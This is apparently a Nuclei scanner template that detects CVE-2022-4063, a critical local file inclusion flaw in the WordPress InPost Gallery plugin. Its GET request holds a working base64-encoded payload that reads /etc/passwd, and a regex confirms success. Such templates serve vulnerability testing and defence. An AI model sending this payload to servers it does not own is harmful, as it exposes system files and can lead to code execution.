http:
- matchers:
  - part: header
    type: word
    words:
    - text/html
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=eyJwYWdlcGF0aCI6ICJmaWxlOi8vL2V0Yy9wYXNzd2QifQ=='
id: CVE-2022-4063
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:pluginus:inpost_gallery:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-4063
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.99594
    epss-score: 0.90722
  description: 'WordPress InPost Gallery plugin before 2.1.4.1 is susceptible to local
    file inclusion. The plugin insecurely uses PHP''s extract() function when rendering
    HTML views, which can allow attackers to force inclusion of malicious files and
    URLs. This, in turn, can enable them to execute code remotely on servers.

    '
  impact: 'The vulnerability allows an attacker to read arbitrary files on the server,
    potentially exposing sensitive information or executing malicious code.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: inpost_gallery
    vendor: pluginus
    verified: true
  name: WordPress InPost Gallery <2.1.4.1 - Local File Inclusion
  reference:
  - https://wpscan.com/vulnerability/6bb07ec1-f1aa-4f4b-9717-c92f651a90a7
  - https://wordpress.org/plugins/inpost-gallery/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-4063
  - https://github.com/cyllective/CVEs
  - https://github.com/im-hanzou/INPGer
  remediation: Fixed in version 2.1.4.1.
  severity: critical
  tags: cve2022,cve,wp-plugin,wp,inpost-gallery,lfi,wordpress,unauth,wpscan,pluginus,vkev,vuln
